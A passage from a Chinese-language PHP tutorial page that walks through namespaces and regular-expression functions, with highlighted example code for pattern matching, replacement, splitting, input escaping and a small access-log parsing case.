class="string">&quot;\n&quot;</span>; <span class="comment">// 7</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Operation count: &quot;</span> . <span class="title class_">MathCalc</span>::<span class="title function_ invoke__">getOperationCount</span>() . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 完全限定名称</span></span><br><span class="line"><span class="keyword">echo</span> \MyProject\Utils\<span class="title function_ invoke__">formatTime</span>(<span class="title function_ invoke__">time</span>()) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用use导入多个元素</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">MyProject</span>\<span class="title">Utils</span>\&#123;</span><br><span class="line">    <span class="title">StringHelper</span> <span class="keyword">as</span> <span class="title">Str</span>,</span><br><span class="line">    <span class="title">formatTime</span>,</span><br><span class="line">    <span class="title">MAX_LENGTH</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title class_">Str</span>::<span class="title function_ invoke__">reverse</span>(<span class="string">&quot;World&quot;</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// dlroW</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">formatTime</span>(<span class="title function_ invoke__">time</span>()) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Max length: &quot;</span> . MAX_LENGTH . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 另一个命名空间中的同名类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">AnotherProject</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StringHelper</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 静态方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">reverse</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">strtoupper</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$string</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在Main命名空间中使用</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Main</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 完全限定名称调用</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title class_">\AnotherProject\StringHelper</span>::<span class="title function_ invoke__">reverse</span>(<span class="string">&quot;Hello&quot;</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// OLLEH</span></span><br></pre></td></tr></table></figure>

<h2 id="16-正则表达式"><a href="#16-正则表达式" class="headerlink" title="16. 正则表达式"></a>16. 正则表达式</h2><h3 id="详细解释-15"><a href="#详细解释-15" class="headerlink" title="详细解释"></a>详细解释</h3><p>正则表达式是一种强大的文本处理工具，用于模式匹配、搜索和替换。</p>
<h3 id="PHP正则表达式函数："><a href="#PHP正则表达式函数：" class="headerlink" title="PHP正则表达式函数："></a>PHP正则表达式函数：</h3><ul>
<li><code>preg_match()</code>：执行正则表达式匹配</li>
<li><code>preg_match_all()</code>：执行全局正则表达式匹配</li>
<li><code>preg_replace()</code>：执行正则表达式搜索和替换</li>
<li><code>preg_split()</code>：通过正则表达式分割字符串</li>
<li><code>preg_quote()</code>：转义正则表达式字符</li>
</ul>
<h3 id="正则表达式元字符："><a href="#正则表达式元字符：" class="headerlink" title="正则表达式元字符："></a>正则表达式元字符：</h3><ul>
<li><code>^</code>：匹配字符串开始</li>
<li><code>$</code>：匹配字符串结束</li>
<li><code>.</code>：匹配任意字符（除换行符外）</li>
<li><code>*</code>：匹配前一个元素0次或多次</li>
<li><code>+</code>：匹配前一个元素1次或多次</li>
<li><code>?</code>：匹配前一个元素0次或1次</li>
<li><code>{n,m}</code>：匹配前一个元素n到m次</li>
<li><code>[]</code>：字符类，匹配其中任一字符</li>
<li><code>|</code>：选择，匹配左边或右边的表达式</li>
<li><code>()</code>：分组，将多个元素视为一个整体</li>
</ul>
<h3 id="16-1-基本正则表达式"><a href="#16-1-基本正则表达式" class="headerlink" title="16.1 基本正则表达式"></a>16.1 基本正则表达式</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// ====================== 元字符详解与验证 ======================</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;【元字符详解与验证】\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. ^: 匹配字符串开始</span></span><br><span class="line"><span class="variable">$pattern_start</span> = <span class="string">&#x27;/^Hello/&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_start</span>, <span class="string">&quot;Hello World&quot;</span>) ? <span class="string">&quot;[✓] ^匹配开头成功\n&quot;</span> : <span class="string">&quot;[✗] ^匹配开头失败\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_start</span>, <span class="string">&quot;Say Hello&quot;</span>) ? <span class="string">&quot;[✗] ^匹配开头错误\n&quot;</span> : <span class="string">&quot;[✓] ^匹配开头正确拒绝\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. $: 匹配字符串结束</span></span><br><span class="line"><span class="variable">$pattern_end</span> = <span class="string">&#x27;/World$/&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_end</span>, <span class="string">&quot;Hello World&quot;</span>) ? <span class="string">&quot;[✓] $匹配结尾成功\n&quot;</span> : <span class="string">&quot;[✗] $匹配结尾失败\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_end</span>, <span class="string">&quot;World Tour&quot;</span>) ? <span class="string">&quot;[✗] $匹配结尾错误\n&quot;</span> : <span class="string">&quot;[✓] $匹配结尾正确拒绝\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. .: 匹配任意字符（除换行符）</span></span><br><span class="line"><span class="variable">$pattern_dot</span> = <span class="string">&#x27;/a.b/&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_dot</span>, <span class="string">&quot;acb&quot;</span>) ? <span class="string">&quot;[✓] .匹配任意字符成功\n&quot;</span> : <span class="string">&quot;[✗] .匹配失败\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_dot</span>, <span class="string">&quot;a\nb&quot;</span>) ? <span class="string">&quot;[✗] .匹配换行符错误\n&quot;</span> : <span class="string">&quot;[✓] .正确跳过换行符\n&quot;</span>; <span class="comment">// 默认不匹配换行符</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. *: 匹配前元素0次或多次</span></span><br><span class="line"><span class="variable">$pattern_star</span> = <span class="string">&#x27;/ab*c/&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_star</span>, <span class="string">&quot;ac&quot;</span>) ? <span class="string">&quot;[✓] *匹配0次成功 (ac)\n&quot;</span> : <span class="string">&quot;[✗] *匹配0次失败\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_star</span>, <span class="string">&quot;abbbc&quot;</span>) ? <span class="string">&quot;[✓] *匹配多次成功 (abbbc)\n&quot;</span> : <span class="string">&quot;[✗] *匹配多次失败\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_star</span>, <span class="string">&quot;adc&quot;</span>) ? <span class="string">&quot;[✗] *错误匹配非b字符\n&quot;</span> : <span class="string">&quot;[✓] *正确拒绝 (adc)\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. +: 匹配前元素1次或多次</span></span><br><span class="line"><span class="variable">$pattern_plus</span> = <span class="string">&#x27;/ab+c/&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_plus</span>, <span class="string">&quot;abc&quot;</span>) ? <span class="string">&quot;[✓] +匹配1次成功 (abc)\n&quot;</span> : <span class="string">&quot;[✗] +匹配1次失败\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_plus</span>, <span class="string">&quot;ac&quot;</span>) ? <span class="string">&quot;[✗] +错误匹配0次 (ac)\n&quot;</span> : <span class="string">&quot;[✓] +正确拒绝0次\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. ?: 匹配前元素0次或1次</span></span><br><span class="line"><span class="variable">$pattern_question</span> = <span class="string">&#x27;/colou?r/&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_question</span>, <span class="string">&quot;color&quot;</span>) ? <span class="string">&quot;[✓] ?匹配0次成功 (color)\n&quot;</span> : <span class="string">&quot;[✗] ?匹配0次失败\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_question</span>, <span class="string">&quot;colour&quot;</span>) ? <span class="string">&quot;[✓] ?匹配1次成功 (colour)\n&quot;</span> : <span class="string">&quot;[✗] ?匹配1次失败\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_question</span>, <span class="string">&quot;colouur&quot;</span>) ? <span class="string">&quot;[✗] ?错误匹配2次 (colouur)\n&quot;</span> : <span class="string">&quot;[✓] ?正确拒绝2次\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 7. &#123;n,m&#125;: 匹配前元素n到m次</span></span><br><span class="line"><span class="variable">$pattern_range</span> = <span class="string">&#x27;/\d&#123;3,5&#125;/&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_range</span>, <span class="string">&quot;123&quot;</span>) ? <span class="string">&quot;[✓] &#123;3,5&#125;匹配3位成功 (123)\n&quot;</span> : <span class="string">&quot;[✗] &#123;3,5&#125;匹配3位失败\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_range</span>, <span class="string">&quot;12345&quot;</span>) ? <span class="string">&quot;[✓] &#123;3,5&#125;匹配5位成功 (12345)\n&quot;</span> : <span class="string">&quot;[✗] &#123;3,5&#125;匹配5位失败\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_range</span>, <span class="string">&quot;12&quot;</span>) ? <span class="string">&quot;[✗] &#123;3,5&#125;错误匹配2位 (12)\n&quot;</span> : <span class="string">&quot;[✓] &#123;3,5&#125;正确拒绝2位\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_range</span>, <span class="string">&quot;123456&quot;</span>) ? <span class="string">&quot;[✗] &#123;3,5&#125;错误匹配6位 (123456)\n&quot;</span> : <span class="string">&quot;[✓] &#123;3,5&#125;正确拒绝6位\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 8. []: 字符类</span></span><br><span class="line"><span class="variable">$pattern_class</span> = <span class="string">&#x27;/[aeiou]/&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_class</span>, <span class="string">&quot;apple&quot;</span>) ? <span class="string">&quot;[✓] []匹配元音成功 (apple)\n&quot;</span> : <span class="string">&quot;[✗] []匹配失败\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_class</span>, <span class="string">&quot;why&quot;</span>) ? <span class="string">&quot;[✗] []错误匹配无元音 (why)\n&quot;</span> : <span class="string">&quot;[✓] []正确拒绝\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 9. |: 选择</span></span><br><span class="line"><span class="variable">$pattern_or</span> = <span class="string">&#x27;/cat|dog/&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_or</span>, <span class="string">&quot;I have a cat&quot;</span>) ? <span class="string">&quot;[✓] |匹配cat成功\n&quot;</span> : <span class="string">&quot;[✗] |匹配失败\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_or</span>, <span class="string">&quot;My dog is cute&quot;</span>) ? <span class="string">&quot;[✓] |匹配dog成功\n&quot;</span> : <span class="string">&quot;[✗] |匹配失败\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_or</span>, <span class="string">&quot;I love birds&quot;</span>) ? <span class="string">&quot;[✗] |错误匹配无cat/dog\n&quot;</span> : <span class="string">&quot;[✓] |正确拒绝\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 10. (): 分组</span></span><br><span class="line"><span class="variable">$pattern_group</span> = <span class="string">&#x27;/(abc)&#123;2&#125;/&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_group</span>, <span class="string">&quot;abcabc&quot;</span>) ? <span class="string">&quot;[✓] ()分组重复成功\n&quot;</span> : <span class="string">&quot;[✗] ()分组匹配失败\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern_group</span>, <span class="string">&quot;abc&quot;</span>) ? <span class="string">&quot;[✗] ()错误匹配单次\n&quot;</span> : <span class="string">&quot;[✓] ()正确拒绝单次\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ====================== 核心函数实战 ======================</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n【核心函数实战】\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// preg_match() - 基础验证</span></span><br><span class="line"><span class="variable">$valid_email</span> = <span class="string">&quot;user+name@sub.domain.co.uk&quot;</span>;</span><br><span class="line"><span class="variable">$invalid_email</span> = <span class="string">&quot;user@.com&quot;</span>;</span><br><span class="line"><span class="variable">$email_pattern</span> = <span class="string">&#x27;/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]&#123;2,6&#125;$/i&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result_valid</span> = <span class="title function_ invoke__">preg_match</span>(<span class="variable">$email_pattern</span>, <span class="variable">$valid_email</span>);</span><br><span class="line"><span class="variable">$result_invalid</span> = <span class="title function_ invoke__">preg_match</span>(<span class="variable">$email_pattern</span>, <span class="variable">$invalid_email</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[邮箱验证] 正例: &quot;</span> . (<span class="variable">$result_valid</span> ? <span class="string">&quot;有效 ✓&quot;</span> : <span class="string">&quot;无效 ✗&quot;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[邮箱验证] 反例: &quot;</span> . (<span class="variable">$result_invalid</span> ? <span class="string">&quot;有效 ✗&quot;</span> : <span class="string">&quot;无效 ✓&quot;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// preg_match_all() - 数据提取</span></span><br><span class="line"><span class="variable">$html</span> = <span class="string">&#x27;&lt;a href=&quot;https://example.com&quot;&gt;首页&lt;/a&gt; | &lt;a href=&quot;/contact&quot;&gt;联系&lt;/a&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$link_pattern</span> = <span class="string">&#x27;/&lt;a\s+href=&quot;([^&quot;]+)&quot;&gt;([^&lt;]+)&lt;\/a&gt;/i&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$link_pattern</span>, <span class="variable">$html</span>, <span class="variable">$matches</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n[链接提取] 正例:\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$matches</span>[<span class="number">0</span>]); <span class="comment">// 完整匹配</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;URLs: &quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$matches</span>[<span class="number">1</span>]) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;文本: &quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$matches</span>[<span class="number">2</span>]) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$no_links</span> = <span class="string">&quot;纯文本无链接&quot;</span>;</span><br><span class="line"><span class="variable">$no_match</span> = <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$link_pattern</span>, <span class="variable">$no_links</span>, <span class="variable">$empty</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[链接提取] 反例: &quot;</span> . (<span class="variable">$no_match</span> === <span class="number">0</span> ? <span class="string">&quot;✓ 无匹配&quot;</span> : <span class="string">&quot;✗ 错误匹配&quot;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// preg_replace() - 内容转换</span></span><br><span class="line"><span class="variable">$text</span> = <span class="string">&quot;价格: <span class="subst">$19</span>.99 | 优惠价: <span class="subst">$9</span>.50&quot;</span>;</span><br><span class="line"><span class="variable">$currency_pattern</span> = <span class="string">&#x27;/\$([\d.]+)/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$formatted</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$currency_pattern</span>, <span class="string">&#x27;¥\1元&#x27;</span>, <span class="variable">$text</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n[货币转换] 正例:\n原始: <span class="subst">$text</span>\n转换: <span class="subst">$formatted</span>\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$no_currency</span> = <span class="string">&quot;免费内容&quot;</span>;</span><br><span class="line"><span class="variable">$unchanged</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$currency_pattern</span>, <span class="string">&#x27;¥\1元&#x27;</span>, <span class="variable">$no_currency</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[货币转换] 反例: &quot;</span> . (<span class="variable">$unchanged</span> === <span class="variable">$no_currency</span> ? <span class="string">&quot;✓ 未修改&quot;</span> : <span class="string">&quot;✗ 错误修改&quot;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// preg_split() - 高级分割</span></span><br><span class="line"><span class="variable">$csv</span> = <span class="string">&quot;苹果; 香蕉, 橙子 | 葡萄&quot;</span>;</span><br><span class="line"><span class="variable">$split_pattern</span> = <span class="string">&#x27;/[;,|]\s*/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$fruits</span> = <span class="title function_ invoke__">preg_split</span>(<span class="variable">$split_pattern</span>, <span class="variable">$csv</span>, -<span class="number">1</span>, PREG_SPLIT_NO_EMPTY);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n[智能分割] 正例:\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$fruits</span>); <span class="comment">// Array ( [0] =&gt; 苹果 [1] =&gt; 香蕉 [2] =&gt; 橙子 [3] =&gt; 葡萄 )</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$bad_pattern</span> = <span class="string">&#x27;/[\d]/&#x27;</span>; <span class="comment">// 错误使用数字分割</span></span><br><span class="line"><span class="variable">$bad_result</span> = <span class="title function_ invoke__">preg_split</span>(<span class="variable">$bad_pattern</span>, <span class="variable">$csv</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[智能分割] 反例: 分割结果数量=&quot;</span> . <span class="title function_ invoke__">count</span>(<span class="variable">$bad_result</span>) . <span class="string">&quot; (错误模式)\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// preg_quote() - 安全转义</span></span><br><span class="line"><span class="variable">$user_input</span> = <span class="string">&quot;100$?+.*&quot;</span>;</span><br><span class="line"><span class="variable">$unsafe_regex</span> = <span class="string">&quot;/<span class="subst">$user_input</span>/&quot;</span>; <span class="comment">// 会导致正则错误</span></span><br><span class="line"><span class="variable">$safe_regex</span> = <span class="string">&quot;/&quot;</span> . <span class="title function_ invoke__">preg_quote</span>(<span class="variable">$user_input</span>, <span class="string">&#x27;/&#x27;</span>) . <span class="string">&quot;/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test_str</span> = <span class="string">&quot;产品价格100$?+.*特惠&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n[安全转义]\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;原始模式: &quot;</span> . @<span class="title function_ invoke__">preg_match</span>(<span class="variable">$unsafe_regex</span>, <span class="variable">$test_str</span>) . <span class="string">&quot; (会产生警告)\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;安全模式: &quot;</span> . <span class="title function_ invoke__">preg_match</span>(<span class="variable">$safe_regex</span>, <span class="variable">$test_str</span>) . <span class="string">&quot; ✓ 正确匹配\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ====================== 综合应用案例 ======================</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n【综合案例：日志分析与转换】\n&quot;</span>;</span><br><span class="line"><span class="variable">$log_data</span> = <span class="string">&lt;&lt;&lt;LOG</span></span><br><span class="line"><span class="string">192.168.1.105 - [09/Dec/2025:14:30:01 +0000] &quot;GET /index.php?user=admin HTTP/1.1&quot; 200 1234</span></span><br><span class="line"><span class="string">10.0.0.5 - [09/Dec/2025:14:35:22 +0000] &quot;POST /login.php HTTP/1.1&quot; 401 567</span></span><br><span class="line"><span class="string">172.16.0.22 - [09/Dec/2025:14:40:15 +0000] &quot;GET /image.png HTTP/1.1&quot; 404 321</span></span><br><span class="line"><span class="string">LOG</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 使用preg_match_all提取日志数据</span></span><br><span class="line"><span class="variable">$log_pattern</span> = <span class="string">&#x27;/^([\d.]+) - \[(.*?)\] &quot;(GET|POST) ([^&quot;]+)&quot; (\d+) (\d+)$/m&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$log_pattern</span>, <span class="variable">$log_data</span>, <span class="variable">$log_matches</span>, PREG_SET_ORDER);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 分析结果</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;检测到 &quot;</span> . <span class="title function_ invoke__">count</span>(<span class="variable">$log_matches</span>) . <span class="string">&quot; 条有效日志\n&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$log_matches</span> <span class="keyword">as</span> <span class="variable">$match</span>) &#123;</span><br><span class="line">    [<span class="variable">$full</span>, <span class="variable">$ip</span>, <span class="variable">$time</span>, <span class="variable">$method</span>, <span class="variable">$path</span>, <span class="variable">$status</span>, <span class="variable">$size</span>] = <span class="variable">$match</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3. 使用preg_replace转换路径格式</span></span><br><span class="line">    <span class="variable">$clean_path</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\?.*$/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$path</span>); <span class="comment">// 移除查询参数</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 4. 使用元字符验证状态码</span></span><br><span class="line">    <span class="variable">$status_desc</span> = <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^2\d&#123;2&#125;$/&#x27;</span>, <span class="variable">$status</span>) ? <span class="string">&quot;成功&quot;</span> : </span><br><span class="line">                  (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^4\d&#123;2&#125;$/&#x27;</span>, <span class="variable">$status</span>) ? <span class="string">&quot;客户端错误&quot;</span> : <span class="string">&quot;其他&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;[%-15s] %s %s → %s (%s | %s字节)\n&quot;</span>, </span><br><span class="line">        <span class="variable">$ip</span>, <span class="variable">$method</span>, <span class="variable">$clean_path</span>, <span class="variable">$status_desc</span>, <span class="variable">$status</span>, <span class="variable">$size</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. 使用preg_split按状态码分组</span></span><br><span class="line"><span class="variable">$grouped</span> = <span class="title function_ invoke__">preg_split</span>(<span class="string">&#x27;/^(.*?)$/m&#x27;</span>, <span class="variable">$log_data</span>, -<span class="number">1</span>, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n[状态码分组] 4xx错误日志:\n&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$grouped</span> <span class="keyword">as</span> <span class="variable">$line</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&quot; (4\d&#123;2&#125;) /&#x27;</span>, <span class="variable">$line</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;⚠️ &quot;</span> . <span class="title function_ invoke__">trim</span>(<span class="variable">$line</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. 安全处理用户输入的搜索关键词</span></span><br><span class="line"><span class="variable">$search_term</span> = <span class="string">&quot;admin?404&quot;</span>;</span><br><span class="line"><span class="variable">$safe_term</span> = <span class="title function_ invoke__">preg_quote</span>(<span class="variable">$search_term</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="variable">$matched_logs</span> = <span class="title function_ invoke__">preg_grep</span>(<span class="string">&quot;/<span class="subst">$safe_term</span>/&quot;</span>, <span class="title function_ invoke__">explode</span>(<span class="string">&quot;\n&quot;</span>, <span class="variable">$log_data</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n[安全搜索] 包含 &#x27;<span class="subst">&#123;$search_term&#125;</span>&#x27; 的日志:\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$matched_logs</span>)) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$matched_logs</span> <span class="keyword">as</span> <span class="variable">$log</span>) <span class="keyword">echo</span> <span class="string">&quot;🔍 <span class="subst">$log</span>\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;✓ 未找到匹配日志\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="16-2-高级正则表达式"><a href="#16-2-高级正则表达式" class="headerlink" title="16.2 高级正则表达式"></a>16.2 高级正则表达式</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 高级正则表达式详解</span></span><br><span class="line"><span class="comment"> * 本示例覆盖PHP正则表达式的高级特性，包括:</span></span><br><span class="line"><span class="comment"> * - 零宽断言(前瞻/后顾)</span></span><br><span class="line"><span class="comment"> * - 命名捕获组</span></span><br><span class="line"><span class="comment"> * - 模式修饰符详解</span></span><br><span class="line"><span class="comment"> * - Unicode支持</span></span><br><span class="line"><span class="comment"> * - 回溯控制</span></span><br><span class="line"><span class="comment"> * - 正则表达式性能优化</span></span><br><span class="line"><span class="comment"> * - 完整的错误处理</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 零宽断言(前瞻/后顾) - 验证密码强度</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;【1. 零宽断言(前瞻/后顾)】\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 密码规则:</span></span><br><span class="line"><span class="comment"> * - 至少8个字符</span></span><br><span class="line"><span class="comment"> * - 必须包含至少一个大写字母(前瞻)</span></span><br><span class="line"><span class="comment"> * - 必须包含至少一个小写字母(前瞻)</span></span><br><span class="line"><span class="comment"> * - 必须包含至少一个数字(前瞻)</span></span><br><span class="line"><span class="comment"> * - 不能以数字开头(后顾)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$password_pattern</span> = <span 